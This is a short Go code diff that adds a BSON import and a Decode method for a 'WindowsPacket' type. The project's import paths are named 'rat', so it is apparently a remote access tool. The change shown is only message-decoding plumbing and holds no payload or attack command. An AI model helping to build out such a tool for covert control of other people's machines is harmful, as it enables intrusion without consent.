@@ -3,6 +3,8 @@ package main
 import (
 	"rat/shared"
 	"rat/shared/network/header"
+
+	"gopkg.in/mgo.v2/bson"
 )
 
 type WindowsPacket struct {
@@ -27,4 +29,9 @@ func (packet WindowsPacket) OnReceive(c *Client) error {
 	}
 
 	return nil
+}
+
+func (packet WindowsPacket) Decode(buf []byte) (IncomingPacket, error) {
+	err := bson.Unmarshal(buf, &packet)
+	return packet, err
 }
